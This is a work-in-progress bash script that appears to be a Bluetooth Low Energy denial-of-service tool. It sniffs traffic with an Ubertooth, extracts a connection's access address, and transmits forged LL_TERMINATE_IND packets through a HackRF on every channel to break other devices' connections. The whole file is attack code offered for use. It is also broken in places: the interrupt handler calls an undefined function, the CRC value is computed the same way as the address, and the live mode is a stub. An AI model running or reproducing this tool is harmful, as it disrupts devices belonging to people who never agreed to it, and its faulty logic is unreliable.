#!/bin/bash
# **Work in Progress**
function ble_init 
    {
       echo -e "\nDump interrupted"
       grep -B2 'LL Data PDU' dump | awk '/AA/ {print $4}' > val
       awk '/CRC/ { print $2 $3 $4}' dump
       if [ -s val ] 
       then 
           echo "Found the packet"
       else
           echo "Didn't find the packet, try again :("
           exit
       fi
       crc=$(sort val | uniq -c | sort -rn | sed -E 's/^ *[0-9]+ //g')
       addr=$(sort val | uniq -c | sort -rn | sed -E 's/^ *[0-9]+ //g')
       echo "The Access Address:" $addr
       echo "Intiating transmission via HackRF"
       trans
   }
function trans
    {
        for i in `seq 0 38`;
        do 
        # Error Code-11 (Connection already exists Already Exists) 
        ./Binaries/btle_tx $i-LL_TERMINATE_IND-AA-$addr-LLID-3-NESN-0-SN-0-MD-0-ErrorCode-11-CRCInit-$crc r3 
        done
        exit_sp
    }
function exit_sp 
    {
        rm val dump
        # Comment out the data if you require the data 
        rm PHY_bit_for_matlab.txt IQ_sample_for_matlab.txt IQ_sample.txt IQ_sample_byte.txt info_byte.txt phy_byte.txt phy_sample.txt 2> /dev/null 
        exit
    }
function probable
    {
        echo "Press Ctrl+C to stop scanning for packets"
        # Establish interrupt handler
        trap ble_dump INT
        # Scanning ...
        # Sudo is optional, depending upon your config
        sudo ubertooth-btle -fI > dump
    }
function live
    {
        echo 'Getting paras from Ubertooth' 
    }
# Init
read -p  "Select Attack Mode 1. Probable(p)  2.Live(l) " pl
case $pl in
    [Pp]* ) probable ;; 
    [Ll]* ) live ;;
    *) echo 'Answer in P/L';;
    esac
